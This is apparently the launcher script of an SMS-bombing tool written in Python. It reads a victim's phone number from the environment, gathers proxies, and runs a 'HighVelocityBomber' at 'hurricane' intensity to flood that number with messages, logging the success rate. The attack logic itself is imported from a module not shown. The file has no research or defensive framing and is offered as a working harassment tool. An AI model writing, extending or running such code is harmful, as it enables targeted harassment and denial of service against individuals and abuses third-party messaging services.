import asyncio
import os
import logging
from bomber import HighVelocityBomber
from proxy_manager import ProxyManager

# Setup logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def main():
    phone = os.getenv("PHONE")
    chat_id = os.getenv("CHAT_ID")
    
    if not phone or not chat_id:
        logger.error("Missing PHONE or CHAT_ID environment variables")
        return

    logger.info(f"Starting bombing session for {phone}")
    
    manager = ProxyManager()
    await manager.fetch_proxies()
    
    bomber = HighVelocityBomber(
        phone=phone,
        bomb_type='sms',
        intensity='hurricane',
        chat_id=chat_id,
        proxy_manager=manager
    )
    
    await bomber.start_attack()
    
    # Report results
    total = bomber.success + bomber.failed
    success_rate = bomber.success / total * 100 if total > 0 else 0
    logger.info(f"Worker completed: {bomber.success} success, {bomber.failed} failed, success rate: {success_rate:.1f}%")

if __name__ == "__main__":
    asyncio.run(main())
